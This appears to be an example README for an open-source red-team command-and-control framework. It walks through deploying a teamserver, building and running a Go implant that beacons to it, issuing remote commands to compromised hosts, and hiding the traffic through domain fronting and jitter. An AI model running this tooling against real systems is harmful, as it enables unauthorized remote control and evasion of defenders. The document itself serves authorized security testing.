# Basic Deployment Example

This example demonstrates the simplest way to deploy and test the Red Team C2 Framework.

## Prerequisites

- Docker and Docker Compose installed
- 5 minutes of time
- Authorized test environment

## Quick Start

### Step 1: Deploy Infrastructure

```bash
# Run the automated deployment script
./deploy.sh

# Or manually:
cd ../..
docker-compose up -d
```

### Step 2: Wait for Services

```bash
# Check service health
docker-compose ps

# Expected output:
# NAME            STATUS          PORTS
# c2_teamserver   Up              0.0.0.0:8443->8443/tcp
# c2_database     Up (healthy)    0.0.0.0:5432->5432/tcp
# c2_controller   Up
```

### Step 3: Build Implant

```bash
# Build for your platform
cd ../../implant
go build -o implant main.go
```

### Step 4: Run Implant (Test System)

**On the authorized test machine**:

```bash
# Run with default settings
./implant --server https://YOUR_TEAMSERVER_IP:8443 \
          --interval 60 \
          --jitter 30 \
          --insecure  # Only for testing with self-signed certs
```

### Step 5: Verify Connection

```bash
# Run the connection test script
./test_connection.sh

# Or manually:
docker-compose exec controller python main.py beacons
```

Expected output:
```
Active Beacons:
┌─────────────────┬───────────┬──────────┬────────┬───────────────┬────────────────────┬────────┐
│ Beacon ID       │ Hostname  │ Username │ OS     │ IP            │ Last Seen          │ Status │
├─────────────────┼───────────┼──────────┼────────┼───────────────┼────────────────────┼────────┤
│ beacon-abc123   │ test-host │ testuser │ linux  │ 192.168.1.100 │ 2024-01-15 10:30   │ active │
└─────────────────┴───────────┴──────────┴────────┴───────────────┴────────────────────┴────────┘
```

### Step 6: Execute Commands

```bash
# Get the beacon ID from step 5
BEACON_ID="beacon-abc123"

# Execute a command
docker-compose exec controller python main.py exec $BEACON_ID "whoami"

# Wait for beacon to check in (interval + jitter time)
sleep 90

# Retrieve output
docker-compose exec controller python main.py output $BEACON_ID
```

### Step 7: Interactive Mode

```bash
# Start interactive operator console
docker-compose exec controller python main.py interactive

# Commands available:
# - list                           # List beacons
# - use <beacon_id>                # Select beacon
# - exec <command>                 # Execute command
# - output                         # Get command output
# - help                           # Show help
# - exit                           # Exit
```

## Cleanup

```bash
# Stop implant (Ctrl+C on test machine)

# Stop infrastructure
docker-compose down

# Remove data (optional)
docker-compose down -v
```

## Troubleshooting

### Implant Won't Connect

**Problem**: Beacon doesn't appear in listing

**Solutions**:
```bash
# 1. Check teamserver is running
docker-compose ps teamserver

# 2. Check teamserver logs
docker-compose logs teamserver

# 3. Test network connectivity
curl -k https://YOUR_TEAMSERVER_IP:8443/health

# 4. Check firewall
sudo ufw status
sudo ufw allow 8443/tcp

# 5. Run implant with debug output
./implant --server https://TEAMSERVER:8443 --insecure --debug
```

### Database Connection Issues

**Problem**: Teamserver can't connect to database

**Solutions**:
```bash
# Check database health
docker-compose ps database

# View database logs
docker-compose logs database

# Verify connection manually
docker-compose exec database psql -U c2user -d c2_database

# Restart services
docker-compose restart
```

### Command Output Not Appearing

**Problem**: Commands execute but no output

**Solutions**:
```bash
# 1. Wait for full beacon interval + jitter
# Example: interval=60s, jitter=30s → wait up to 90s

# 2. Check teamserver logs for output receipt
docker-compose logs -f teamserver

# 3. Verify command_id matches
docker-compose exec controller python main.py output BEACON_ID --all
```

## Architecture

```
┌─────────────┐         HTTPS/TLS 1.3        ┌──────────────┐
│   Implant   │◄──────────────────────────►│  Teamserver  │
│  (Go 1.21)  │      Encrypted C2 Traffic    │ (Rust/Axum)  │
└─────────────┘                              └──────┬───────┘
                                                    │
                                                    │ PostgreSQL
                                                    │
                                             ┌──────▼───────┐
                                             │   Database   │
                                             │ (PostgreSQL) │
                                             └──────────────┘
                                                    ▲
                                                    │ HTTP API
                                                    │
                                             ┌──────┴───────┐
                                             │  Controller  │
                                             │   (Python)   │
                                             └──────────────┘
```

## Next Steps

1. **Explore API**: Check `examples/api_client/` for programmatic access
2. **Add Modules**: See `examples/custom_module/` for extending capabilities
3. **Integration Testing**: Review `examples/integration_tests/` for automated testing
4. **Production Deployment**: Read `DEPLOYMENT.md` for production considerations

## Security Notes

- This example uses self-signed certificates (`--insecure` flag)
- Default passwords are used (change in production)
- No OPSEC features enabled (for learning purposes)
- Runs on localhost (not production-ready)

**For production use**:
- Use valid TLS certificates
- Change all default credentials
- Enable domain fronting
- Configure jitter and sleep properly
- Review `SECURITY_POLICY.md`

## Support

- **Full Documentation**: `/docs` directory
- **API Reference**: `API.md`
- **Architecture**: `ARCHITECTURE.md`
- **Issues**: https://github.com/Raoof128/CRTIAE/issues
